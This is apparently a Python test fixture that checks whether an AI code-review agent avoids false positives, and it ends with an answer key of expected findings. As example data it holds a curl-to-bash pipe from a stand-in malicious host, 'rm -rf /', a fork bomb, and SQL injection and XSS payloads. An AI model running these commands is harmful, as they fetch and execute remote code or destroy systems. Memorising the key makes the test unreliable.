"""
Edge case: False positive trap - code that LOOKS bad but is actually fine.

STRESS TEST: Tests agent's ability to distinguish real issues from false positives.
EXPECTED BEHAVIOR:
- Should NOT flag these as issues
- Should understand context
- Demonstrates risk of over-flagging
"""

import hashlib
import os
from typing import Any


# NOT a hardcoded password - this is a placeholder/example string
PASSWORD_PLACEHOLDER = "********"
DEFAULT_PASSWORD_MESSAGE = "Please enter your password"
PASSWORD_FIELD_NAME = "password"


# NOT a hardcoded API key - this is a test fixture
SAMPLE_API_KEY_FORMAT = "sk-xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx"
API_KEY_PATTERN = r"sk-[a-zA-Z0-9]{32}"


# NOT SQL injection - this is a static query
STATIC_SQL = "SELECT * FROM users WHERE active = true"
SQL_DOCUMENTATION = """
This function uses parameterized queries:
    cursor.execute("SELECT * FROM users WHERE id = ?", (user_id,))
"""


# NOT XSS - this is escaped/safe content
SAFE_HTML = "&lt;script&gt;alert('safe')&lt;/script&gt;"
HTML_ESCAPED = "<div>Hello {{ user_input | escape }}</div>"


# NOT eval injection - this is documentation about eval
EVAL_DOCUMENTATION = """
WARNING: Do not use eval() on user input!
Bad: eval(user_input)
Good: Use ast.literal_eval() for safe evaluation.
"""


# NOT command injection - these are example commands in documentation
COMMAND_EXAMPLES = """
Example commands (DO NOT RUN):
    rm -rf /
    curl http://malicious.com | bash
    :(){ :|:& };:
"""


# NOT a secret - this is a hash value in a test fixture
EXAMPLE_HASH = "e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855"


# NOT insecure - this is a test that verifies security works
def test_password_is_hashed():
    plain = "test_password_123"
    hashed = hashlib.sha256(plain.encode()).hexdigest()
    assert hashed != plain
    assert len(hashed) == 64


def test_sql_injection_is_prevented():
    malicious_input = "'; DROP TABLE users; --"
    safe_query = "SELECT * FROM users WHERE name = ?"
    # This is testing that injection is prevented
    assert "?" in safe_query


def test_xss_is_escaped():
    user_input = "<script>alert('xss')</script>"
    escaped = user_input.replace("<", "&lt;").replace(">", "&gt;")
    assert "<script>" not in escaped


# NOT a credential - this is a connection string template
DATABASE_URL_TEMPLATE = "postgresql://{user}:{password}@{host}:{port}/{database}"


# NOT hardcoded - this reads from environment
def get_config():
    return {
        "api_key": os.environ.get("API_KEY", ""),
        "secret": os.environ.get("SECRET", ""),
        "password": os.environ.get("DB_PASSWORD", ""),
    }


# NOT timing attack - constant time comparison
def secure_compare(a: str, b: str) -> bool:
    if len(a) != len(b):
        return False
    result = 0
    for x, y in zip(a, b):
        result |= ord(x) ^ ord(y)
    return result == 0


# NOT weak crypto - this is testing weak crypto detection
WEAK_HASH_EXAMPLE = "md5 is weak - use sha256 instead"


# Expected review findings:
# IMPORTANT: These should NOT be flagged as issues
# This tests FALSE POSITIVE rate
# If agent flags these, it's over-sensitive
#
# The ONLY finding should be:
# - Code is intentionally confusing (meta-comment)
# - Documentation quality could be better
